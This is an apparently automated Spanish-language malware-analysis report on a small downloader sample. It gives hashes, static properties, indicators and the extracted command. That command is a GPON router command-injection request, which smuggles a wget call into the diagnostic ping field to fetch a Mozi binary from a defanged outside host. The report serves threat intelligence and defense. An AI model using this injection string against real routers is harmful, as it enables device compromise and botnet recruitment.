# 🧬 Payload Analysis

`3dab56c1f9d2a78ba0bcce932233a578daf04c53aa6e367374ea63154be7594b`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 139 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://111.92.152.XXX:57968/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `3dab56c1f9d2a78ba0bcce932233a578daf04c53aa6e367374ea63154be7594b`
- **MD5:** `653e6b5d5f50de826bd18a8d3e7d3eb8`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 139 B |
| Entropía | 5.11 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92.152.XXX:57968/Mozi.m+-O+->/tmp/gpon80;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://111.92.152.XXX:57968/Mozi.m+-O+- | strings |
| ip | 111.92.152.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92.152.XXX:57968/Mozi.m+-O+->/tmp/gpon80;s | strings |
| hash | 3dab56c1f9d2a78ba0bcce932233a578daf04c53aa6e367374ea63154be7594b | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
